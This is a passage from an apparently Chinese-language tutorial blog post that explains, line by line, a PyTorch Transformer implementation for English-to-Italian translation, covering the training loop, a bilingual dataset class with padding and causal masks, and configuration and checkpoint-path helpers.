<h3 id="训练主函数"><a href="#训练主函数" class="headerlink" title="训练主函数"></a>训练主函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_model</span>(<span class="params">config</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Transformer模型训练主函数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        config: 配置字典，包含所有训练超参数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 选择设备</span></span><br><span class="line">    device = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;mps&quot;</span> <span class="keyword">if</span> torch.has_mps <span class="keyword">or</span> torch.backends.mps.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用设备:&quot;</span>, device)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> device == <span class="string">&#x27;cuda&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;设备名称: <span class="subst">&#123;torch.cuda.get_device_name(device.index)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;显存大小: <span class="subst">&#123;torch.cuda.get_device_properties(device.index).total_memory / <span class="number">1024</span> ** <span class="number">3</span>&#125;</span> GB&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    device = torch.device(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建权重保存目录</span></span><br><span class="line">    Path(<span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;datasource&#x27;</span>]&#125;</span>_<span class="subst">&#123;config[<span class="string">&#x27;model_folder&#x27;</span>]&#125;</span>&quot;</span>).mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载数据集</span></span><br><span class="line">    train_dataloader, val_dataloader, tokenizer_src, tokenizer_tgt = get_ds(config)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建模型</span></span><br><span class="line">    model = get_model(config, tokenizer_src.get_vocab_size(), tokenizer_tgt.get_vocab_size()).to(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TensorBoard记录器</span></span><br><span class="line">    writer = SummaryWriter(config[<span class="string">&#x27;experiment_name&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 优化器</span></span><br><span class="line">    optimizer = torch.optim.Adam(model.parameters(), lr=config[<span class="string">&#x27;lr&#x27;</span>], eps=<span class="number">1e-9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载预训练模型（如果有）</span></span><br><span class="line">    initial_epoch = <span class="number">0</span></span><br><span class="line">    global_step = <span class="number">0</span></span><br><span class="line">    preload = config[<span class="string">&#x27;preload&#x27;</span>]</span><br><span class="line">    model_filename = latest_weights_file_path(config) <span class="keyword">if</span> preload == <span class="string">&#x27;latest&#x27;</span> <span class="keyword">else</span> get_weights_file_path(config, preload) <span class="keyword">if</span> preload <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> model_filename:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;加载模型: <span class="subst">&#123;model_filename&#125;</span>&#x27;</span>)</span><br><span class="line">        state = torch.load(model_filename)</span><br><span class="line">        model.load_state_dict(state[<span class="string">&#x27;model_state_dict&#x27;</span>])</span><br><span class="line">        initial_epoch = state[<span class="string">&#x27;epoch&#x27;</span>] + <span class="number">1</span></span><br><span class="line">        optimizer.load_state_dict(state[<span class="string">&#x27;optimizer_state_dict&#x27;</span>])</span><br><span class="line">        global_step = state[<span class="string">&#x27;global_step&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;从头开始训练&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 损失函数（带标签平滑）</span></span><br><span class="line">    loss_fn = nn.CrossEntropyLoss(</span><br><span class="line">        ignore_index=tokenizer_src.token_to_id(<span class="string">&#x27;[PAD]&#x27;</span>),</span><br><span class="line">        label_smoothing=<span class="number">0.1</span></span><br><span class="line">    ).to(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练循环</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(initial_epoch, config[<span class="string">&#x27;num_epochs&#x27;</span>]):</span><br><span class="line">        torch.cuda.empty_cache()</span><br><span class="line">        model.train()</span><br><span class="line">        batch_iterator = tqdm(train_dataloader, desc=<span class="string">f&quot;Epoch <span class="subst">&#123;epoch:02d&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> batch <span class="keyword">in</span> batch_iterator:</span><br><span class="line">            <span class="comment"># 准备数据</span></span><br><span class="line">            encoder_input = batch[<span class="string">&#x27;encoder_input&#x27;</span>].to(device)</span><br><span class="line">            decoder_input = batch[<span class="string">&#x27;decoder_input&#x27;</span>].to(device)</span><br><span class="line">            encoder_mask = batch[<span class="string">&#x27;encoder_mask&#x27;</span>].to(device)</span><br><span class="line">            decoder_mask = batch[<span class="string">&#x27;decoder_mask&#x27;</span>].to(device)</span><br><span class="line">            label = batch[<span class="string">&#x27;label&#x27;</span>].to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 前向传播</span></span><br><span class="line">            encoder_output = model.encode(encoder_input, encoder_mask)</span><br><span class="line">            decoder_output = model.decode(encoder_output, encoder_mask, decoder_input, decoder_mask)</span><br><span class="line">            proj_output = model.project(decoder_output)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算损失</span></span><br><span class="line">            loss = loss_fn(proj_output.view(-<span class="number">1</span>, tokenizer_tgt.get_vocab_size()), label.view(-<span class="number">1</span>))</span><br><span class="line">            batch_iterator.set_postfix(&#123;<span class="string">&quot;loss&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;loss.item():<span class="number">6.3</span>f&#125;</span>&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录到TensorBoard</span></span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;train loss&#x27;</span>, loss.item(), global_step)</span><br><span class="line">            writer.flush()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 反向传播</span></span><br><span class="line">            loss.backward()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新参数</span></span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad(set_to_none=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            global_step += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 每个epoch后运行验证</span></span><br><span class="line">        run_validation(model, val_dataloader, tokenizer_src, tokenizer_tgt, </span><br><span class="line">                      config[<span class="string">&#x27;seq_len&#x27;</span>], device, <span class="keyword">lambda</span> msg: batch_iterator.write(msg), </span><br><span class="line">                      global_step, writer)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存模型</span></span><br><span class="line">        model_filename = get_weights_file_path(config, <span class="string">f&quot;<span class="subst">&#123;epoch:02d&#125;</span>&quot;</span>)</span><br><span class="line">        torch.save(&#123;</span><br><span class="line">            <span class="string">&#x27;epoch&#x27;</span>: epoch,</span><br><span class="line">            <span class="string">&#x27;model_state_dict&#x27;</span>: model.state_dict(),</span><br><span class="line">            <span class="string">&#x27;optimizer_state_dict&#x27;</span>: optimizer.state_dict(),</span><br><span class="line">            <span class="string">&#x27;global_step&#x27;</span>: global_step</span><br><span class="line">        &#125;, model_filename)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文详细介绍了Transformer模型的原理和PyTorch实现，主要内容包括：</p>
<p><strong>核心组件</strong></p>
<ul>
<li>输入嵌入与位置编码：将离散token转换为连续向量并注入位置信息</li>
<li>多头注意力机制：从多个角度并行捕捉序列中的依赖关系</li>
<li>前馈神经网络：对每个位置独立进行非线性变换</li>
<li>层归一化与残差连接：稳定训练过程，缓解梯度消失</li>
</ul>
<p><strong>模型架构</strong></p>
<ul>
<li>编码器：6层堆叠，每层包含自注意力和前馈网络</li>
<li>解码器：6层堆叠，每层包含自注意力、交叉注意力和前馈网络</li>
<li>投影层：将解码器输出映射到词汇表空间</li>
</ul>
<p><strong>训练流程</strong></p>
<ul>
<li>数据处理：分词、批处理、掩码生成</li>
<li>训练循环：前向传播、损失计算、反向传播、参数更新</li>
<li>验证评估：使用CER、WER、BLEU等指标评估模型性能</li>
</ul>
<p>Transformer的成功在于其完全基于注意力机制的架构设计，摒弃了传统的循环结构，实现了高效的并行计算和长距离依赖建模，为后续的BERT、GPT等预训练模型奠定了基础。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    optimizer.step()</span><br><span class="line"></span><br><span class="line">    # 清空梯度，节省内存</span><br><span class="line">    optimizer.zero_grad(set_to_none=True)</span><br><span class="line"></span><br><span class="line">    # 更新步数</span><br><span class="line">    global_step += 1</span><br><span class="line"></span><br><span class="line"># 每个epoch结束后运行验证逻辑</span><br><span class="line">run_validation(</span><br><span class="line">    model,</span><br><span class="line">    val_dataloader,</span><br><span class="line">    tokenizer_src,</span><br><span class="line">    tokenizer_tgt,</span><br><span class="line">    config[&#x27;seq_len&#x27;],</span><br><span class="line">    device,</span><br><span class="line">    lambda msg: batch_iterator.write(msg),  # 用 tqdm 输出日志信息</span><br><span class="line">    global_step,</span><br><span class="line">    writer</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 每个epoch结束后保存模型状态</span><br><span class="line">model_filename = get_weights_file_path(config, f&quot;&#123;epoch:02d&#125;&quot;)</span><br><span class="line">torch.save(&#123;</span><br><span class="line">    &#x27;epoch&#x27;: epoch,</span><br><span class="line">    &#x27;model_state_dict&#x27;: model.state_dict(),</span><br><span class="line">    &#x27;optimizer_state_dict&#x27;: optimizer.state_dict(),</span><br><span class="line">    &#x27;global_step&#x27;: global_step</span><br><span class="line">&#125;, model_filename)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  <span class="comment"># 主程序入口，确保当前脚本被直接运行时才执行以下代码</span></span><br><span class="line">    warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)  <span class="comment"># 忽略所有警告信息，保持输出界面清爽</span></span><br><span class="line">    config = get_config()  <span class="comment"># 获取训练配置参数，通常来自配置文件或定义函数</span></span><br><span class="line">    train_model(config)  <span class="comment"># 调用训练函数，开始模型训练流程</span></span><br></pre></td></tr></table></figure>

<h2 id="Dataset"><a href="#Dataset" class="headerlink" title="Dataset"></a>Dataset</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#处理双语数据集</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br></pre></td></tr></table></figure>

<p><strong>import torch</strong>：导入 PyTorch 主库，用于张量运算。</p>
<p><strong>import torch.nn as nn</strong>：导入神经网络模块并简写为 <code>nn</code>，方便后续如果需要网络层时使用。</p>
<p><strong>from torch.utils.data import Dataset</strong>：从PyTorch数据工具中导入 <code>Dataset</code> 基类，用来构建自定义数据集。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义一个新的数据集类 BilingualDataset，继承自 PyTorch 的 Dataset，用于加载双语翻译对。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BilingualDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ds, tokenizer_src, tokenizer_tgt, src_lang, tgt_lang, seq_len</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.seq_len = seq_len</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.ds = ds</span><br><span class="line">        <span class="variable language_">self</span>.tokenizer_src = tokenizer_src</span><br><span class="line">        <span class="variable language_">self</span>.tokenizer_tgt = tokenizer_tgt</span><br><span class="line">        <span class="variable language_">self</span>.src_lang = src_lang</span><br><span class="line">        <span class="variable language_">self</span>.tgt_lang = tgt_lang</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>init</strong>：初始化方法，接受以下参数：</p>
<ul>
<li><code>ds</code>：原始数据集（如从 HuggingFace Dataset 加载的翻译对）。</li>
<li><code>tokenizer_src</code> &#x2F; <code>tokenizer_tgt</code>：源语言和目标语言的分词器。</li>
<li><code>src_lang</code> &#x2F; <code>tgt_lang</code>：字符串，指明在每个数据项里使用哪个语言字段。</li>
<li><code>seq_len</code>：固定的序列长度（包含特殊token）。</li>
<li>将这些参数<strong>保存</strong>到实例属性，以便后续 <code>__getitem__</code> 中使用。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.sos_token = torch.tensor([tokenizer_tgt.token_to_id(<span class="string">&quot;[SOS]&quot;</span>)], dtype=torch.int64)</span><br><span class="line"><span class="variable language_">self</span>.eos_token = torch.tensor([tokenizer_tgt.token_to_id(<span class="string">&quot;[EOS]&quot;</span>)], dtype=torch.int64)</span><br><span class="line"><span class="variable language_">self</span>.pad_token = torch.tensor([tokenizer_tgt.token_to_id(<span class="string">&quot;[PAD]&quot;</span>)], dtype=torch.int64)</span><br></pre></td></tr></table></figure>

<p>从目标分词器中获取特殊符号 <code>[SOS]</code>、<code>[EOS]</code>、<code>[PAD]</code> 的ID，并封装成形状为 <code>(1,)</code> 的整型张量，方便后面拼接。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义数据集长度</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.ds)</span><br></pre></td></tr></table></figure>

<p><strong>len</strong>：返回数据集的条目数，使得 DataLoader 能够知道迭代上限。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义获取项目方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        src_target_pair = <span class="variable language_">self</span>.ds[idx]</span><br><span class="line">        src_text = src_target_pair[<span class="string">&#x27;translation&#x27;</span>][<span class="variable language_">self</span>.src_lang]</span><br><span class="line">        tgt_text = src_target_pair[<span class="string">&#x27;translation&#x27;</span>][<span class="variable language_">self</span>.tgt_lang]</span><br></pre></td></tr></table></figure>

<p><strong>getitem</strong>：根据索引 <code>idx</code> 取出一条翻译对，分别抽取源语言文本 <code>src_text</code> 和目标语言文本 <code>tgt_text</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Transform the text into tokens</span></span><br><span class="line">enc_input_tokens = <span class="variable language_">self</span>.tokenizer_src.encode(src_text).ids</span><br><span class="line">dec_input_tokens = <span class="variable language_">self</span>.tokenizer_tgt.encode(tgt_text).ids</span><br></pre></td></tr></table></figure>

<p>分别对源文和目标文进行分词，得到 ID 列表 <code>enc_input_tokens</code>、<code>dec_input_tokens</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Add sos, eos and padding to each sentence</span></span><br><span class="line">enc_num_padding_tokens = <span class="variable language_">self</span>.seq_len - <span class="built_in">len</span>(enc_input_tokens) - <span class="number">2</span>  <span class="comment"># We will add &lt;s&gt; and &lt;/s&gt;</span></span><br><span class="line"><span class="comment"># We will only add &lt;s&gt;, and &lt;/s&gt; only on the label</span></span><br><span class="line">dec_num_padding_tokens = <span class="variable language_">self</span>.seq_len - <span class="built_in">len</span>(dec_input_tokens) - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>计算要补多少个 <code>[PAD]</code>：</p>
<ul>
<li>源端要加 <code>[SOS]</code>+<code>[EOS]</code> 共2个特殊符，故剩余长度为 <code>seq_len - 原始长度 - 2</code>。</li>
<li>目标端的 decoder 输入只加 <code>[SOS]</code>，故剩余长度为 <code>seq_len - 原始长度 - 1</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> enc_num_padding_tokens &lt; <span class="number">0</span> <span class="keyword">or</span> dec_num_padding_tokens &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Sentence is too long&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果算出来的补齐长度<strong>为负</strong>，说明句子太长，超过了 <code>seq_len</code>，直接抛错提醒。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切割三个张量</span></span><br><span class="line"><span class="comment"># Add &lt;s&gt; and &lt;/s&gt; token</span></span><br><span class="line">        encoder_input = torch.cat(</span><br><span class="line">            [</span><br><span class="line">                <span class="variable language_">self</span>.sos_token,<span class="comment">#首先是这个句子的开头标记，</span></span><br><span class="line">                torch.tensor(enc_input_tokens, dtype=torch.int64),<span class="comment">#然后是源文本的标记</span></span><br><span class="line">                <span class="variable language_">self</span>.eos_token,<span class="comment">#然后是句子的结尾标记 </span></span><br><span class="line">                torch.tensor([<span class="variable language_">self</span>.pad_token] * enc_num_padding_tokens, dtype=torch.int64),<span class="comment">#然后是足够的填充标记以达到序列长度</span></span><br><span class="line">            ],</span><br><span class="line">            dim=<span class="number">0</span>,</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>构造 Encoder 输入序列：</p>
<ol>
<li><p>添加 <code>[SOS]</code>；</p>
</li>
<li><p>源语言分词 ID；</p>
</li>
<li><p>添加 <code>[EOS]</code>；</p>
</li>
<li><p>补齐若干个 <code>[PAD]</code>；</p>
<p> 最后拼成形状 <code>(seq_len,)</code> 的张量。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Add only &lt;s&gt; token</span></span><br><span class="line">decoder_input = torch.cat(</span><br><span class="line">    [</span><br><span class="line">        <span class="variable language_">self</span>.sos_token,</span><br><span class="line">        torch.tensor(dec_input_tokens, dtype=torch.int64),</span><br><span class="line">        torch.tensor([<span class="variable language_">self</span>.pad_token] * dec_num_padding_tokens, dtype=torch.int64),</span><br><span class="line">    ],</span><br><span class="line">    dim=<span class="number">0</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>构造Decoder输入序列：只在最前面加 <code>[SOS]</code> 和尾部补齐 <code>[PAD]</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Add only &lt;/s&gt; token</span></span><br><span class="line">label = torch.cat(</span><br><span class="line">    [</span><br><span class="line">        torch.tensor(dec_input_tokens, dtype=torch.int64),</span><br><span class="line">        <span class="variable language_">self</span>.eos_token,</span><br><span class="line">        torch.tensor([<span class="variable language_">self</span>.pad_token] * dec_num_padding_tokens, dtype=torch.int64),</span><br><span class="line">    ],</span><br><span class="line">    dim=<span class="number">0</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>构造训练目标（标签）序列：紧跟分词 ID 后面加 <code>[EOS]</code>，再补齐。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Double check the size of the tensors to make sure they are all seq_len long</span></span><br><span class="line"><span class="keyword">assert</span> encoder_input.size(<span class="number">0</span>) == <span class="variable language_">self</span>.seq_len</span><br><span class="line"><span class="keyword">assert</span> decoder_input.size(<span class="number">0</span>) == <span class="variable language_">self</span>.seq_len</span><br><span class="line"><span class="keyword">assert</span> label.size(<span class="number">0</span>) == <span class="variable language_">self</span>.seq_len</span><br></pre></td></tr></table></figure>

<p>断言三者长度都等于 <code>seq_len</code>，<strong>保证模型输入输出的一致性。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="string">&quot;encoder_input&quot;</span>: encoder_input,  <span class="comment"># (seq_len)编码器输入,是越位的序列长度</span></span><br><span class="line">    <span class="string">&quot;decoder_input&quot;</span>: decoder_input,  <span class="comment"># (seq_len)解码器输入,是一个序列长度的标记数</span></span><br><span class="line">    <span class="string">&quot;encoder_mask&quot;</span>: (encoder_input != <span class="variable language_">self</span>.pad_token).unsqueeze(<span class="number">0</span>).unsqueeze(<span class="number">0</span>).<span class="built_in">int</span>(), <span class="comment"># (1, 1, seq_len)</span></span><br><span class="line">    <span class="comment">#编码器掩码，通过添加填充标记来增加编码器输入句子的大小，但是我们 我们不希望这些填充标记参与自注意力机制，所以我们需要构建一个掩码，不希望这些标记被自注意力机制看到。我们还会挤压以添加此序列维度，稍后还会添加批处理维度。然后我们将其转换为整数，因此这是一个序列长度。</span></span><br><span class="line">    <span class="string">&quot;decoder_mask&quot;</span>: (decoder_input != <span class="variable language_">self</span>.pad_token).unsqueeze(<span class="number">0</span>).<span class="built_in">int</span>() &amp; causal_mask(decoder_input.size(<span class="number">0</span>)), <span class="comment"># (1, seq_len) &amp; (1, seq_len, seq_len),</span></span><br><span class="line">    <span class="comment">#解码器，我们需要一个特殊的掩码，即因果掩码。意味着每个单词只能查看前面的单词，每个单词只能查看未知的填充单词，因此我们不希望填充标记参与自注意力机制，我们只希望真实的单词参与其中，并且我们也不希望每个单词都关注其后面的单词，而只关注其前面的单词，因此我将在这里使用一种称为因果掩码的方法稍后我们会构建它。</span></span><br><span class="line">    <span class="string">&quot;label&quot;</span>: label,  <span class="comment"># (seq_len)</span></span><br><span class="line">    <span class="string">&quot;src_text&quot;</span>: src_text,</span><br><span class="line">    <span class="string">&quot;tgt_text&quot;</span>: tgt_text,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回由编码器输入组成的字典，包含：</p>
<ul>
<li><code>encoder_input</code> 和 <code>decoder_input</code>：前面拼好的整型张量；</li>
<li><code>encoder_mask</code>：对 <code>encoder_input</code> 中非 <code>[PAD]</code> 的位置置 1，shape 为 <code>(1,1,seq_len)</code>，用于 self-attention。</li>
<li><code>decoder_mask</code>：先对非 <code>[PAD]</code> 位置置 1，得到 <code>(1,seq_len)</code>，再与 <code>causal_mask</code>（下述函数生成的因果遮挡矩阵）按位 AND，得到 <code>(1,seq_len,seq_len)</code>，用于 Transformer 解码器的自回归限制。</li>
<li><code>label</code>：训练用的目标序列；</li>
<li><code>src_text</code>、<code>tgt_text</code>：原始文本，方便后续打印或调试。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">causal_mask</span>(<span class="params">size</span>):</span><br><span class="line">    mask = torch.triu(torch.ones((<span class="number">1</span>, size, size)), diagonal=<span class="number">1</span>).<span class="built_in">type</span>(torch.<span class="built_in">int</span>)</span><br><span class="line">    <span class="comment">#这个方法将返回对角线上方的每个值，其他所有值都将变为零，所以我们想要对角线的一种类型，我们希望它是整数，我们要做的是返回掩码等于零，所以这将返回对角线上方的所有值，对角线下方的所有值都将变为零，我们实际上想要相反的结果，即零应该会在这个表达式中变为真，所有非0的值都会变为假</span></span><br><span class="line">    <span class="keyword">return</span> mask == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>causal_mask</strong>：生成一个上三角全 1、主对角线以上（<code>diagonal=1</code>）为 1 的张量，然后取反得到下三角及对角线位置为 <code>True</code>，上三角为 <code>False</code>，用于在解码时屏蔽未来位置。</p>
<p>这段代码实现了一个用于序列到序列（sequence‑to‑sequence）机器翻译任务的数据集类 <code>BilingualDataset</code>。它将原始的双语文本对：</p>
<ol>
<li><strong>分词</strong> → 得到整数 ID 列表</li>
<li><strong>添加特殊标记</strong> <code>[SOS]</code>, <code>[EOS]</code> 和 <code>[PAD]</code> → 统一成固定长度</li>
<li><strong>构造注意力掩码</strong> → Encoder 掩掉 PAD，Decoder 同时掩掉 PAD 和未来 token</li>
<li><strong>返回模型所需的输入格式</strong>（包括 <code>encoder_input</code>、<code>decoder_input</code>、注意力掩码、以及训练标签）</li>
</ol>
<p>从而能够直接喂给基于Transformer的翻译模型进行训练或推理。</p>
<h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_config</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;batch_size&quot;</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="string">&quot;num_epochs&quot;</span>: <span class="number">20</span>,</span><br><span class="line">        <span class="string">&quot;lr&quot;</span>: <span class="number">10</span>**-<span class="number">4</span>,</span><br><span class="line">        <span class="string">&quot;seq_len&quot;</span>: <span class="number">350</span>,</span><br><span class="line">        <span class="string">&quot;d_model&quot;</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="string">&quot;datasource&quot;</span>: <span class="string">&#x27;opus_books&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;lang_src&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lang_tgt&quot;</span>: <span class="string">&quot;it&quot;</span>,</span><br><span class="line">        <span class="string">&quot;model_folder&quot;</span>: <span class="string">&quot;weights&quot;</span>,</span><br><span class="line">        <span class="string">&quot;model_basename&quot;</span>: <span class="string">&quot;tmodel_&quot;</span>,</span><br><span class="line">        <span class="string">&quot;preload&quot;</span>: <span class="string">&quot;latest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenizer_file&quot;</span>: <span class="string">&quot;tokenizer_&#123;0&#125;.json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;experiment_name&quot;</span>: <span class="string">&quot;runs/tmodel&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>get_config</code>：返回一个字典对象，包含模型训练所需的各种超参数和文件配置。</p>
<p><code>batch_size</code>：每批次处理8条样本</p>
<p><code>num_epochs</code>：训练轮数为20</p>
<p><code>lr</code>：学习率设置为0.0001</p>
<p><code>seq_len</code>：每个输入序列最大长度为350</p>
<p><code>d_model</code>：Transformer模型的隐藏维度为512</p>
<p><code>datasource</code>：数据源名，便于标识不同数据集（此处是 <code>opus_books</code>）</p>
<p><code>lang_src</code> 和 <code>lang_tgt</code>：源语言和目标语言（如从英语翻译到意大利语）</p>
<p><code>model_folder</code>：保存模型权重的文件夹（如 <code>weights</code>）</p>
<p><code>model_basename</code>：模型文件的前缀名（如 <code>tmodel_5.pt</code>）</p>
<p><code>preload</code>：加载哪个权重（”latest” 代表自动找最新的）</p>
<p><code>tokenizer_file</code>：分词器的文件名模板</p>
<p><code>experiment_name</code>：实验记录的路径（如TensorBoard的日志）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_weights_file_path</span>(<span class="params">config, epoch: <span class="built_in">str</span></span>):</span><br><span class="line">    model_folder = <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;datasource&#x27;</span>]&#125;</span>_<span class="subst">&#123;config[<span class="string">&#x27;model_folder&#x27;</span>]&#125;</span>&quot;</span>  <span class="comment"># 拼接成目录名</span></span><br><span class="line">    model_filename = <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;model_basename&#x27;</span>]&#125;</span><span class="subst">&#123;epoch&#125;</span>.pt&quot;</span>  <span class="comment"># 拼接模型文件名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(Path(<span class="string">&#x27;.&#x27;</span>) / model_folder / model_filename)  <span class="comment"># 返回完整路径字符串</span></span><br></pre></td></tr></table></figure>

<p><code>get_weights_file_path</code>：根据配置和给定的<code>epoch</code>数，生成当前epoch模型文件的完整路径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">latest_weights_file_path</span>(<span class="params">config</span>):</span><br><span class="line">    model_folder = <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;datasource&#x27;</span>]&#125;</span>_<span class="subst">&#123;config[<span class="string">&#x27;model_folder&#x27;</span>]&#125;</span>&quot;</span>  <span class="comment">#权重文件所在的目录</span></span><br><span class="line">    model_filename = <span class="string">f&quot;<span class="subst">&#123;config[<span class="string">&#x27;model_basename&#x27;</span>]&#125;</span>*&quot;</span>  <span class="comment">#匹配所有模型文件</span></span><br><span class="line">    weights_files = <span class="built_in">list</span>(Path(model_folder).glob(model_filename))  <span class="comment"># 用glob匹配目录中所有模型文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(weights_files) == <span class="number">0</span>:  <span class="comment">#如果没有模型文件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    weights_files.sort()  <span class="comment">#按名称排序</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(weights_files[-<span class="number">1</span>])  <span class="comment">#返回最新的那个（排序最后一个）</span></span><br></pre></td></tr></table></figure>

<p><code>latest_weights_file_path</code>：查找给定目录下最新（最后一个按名字排序）的模型权重文件的完整路径。如果没有任何权重文件，则返回 <code>None</code>。</p>
<p>这段代码提供了训练和管理模型的一套<strong>配置信息管理工具</strong>。主要实现了以下功能：</p>
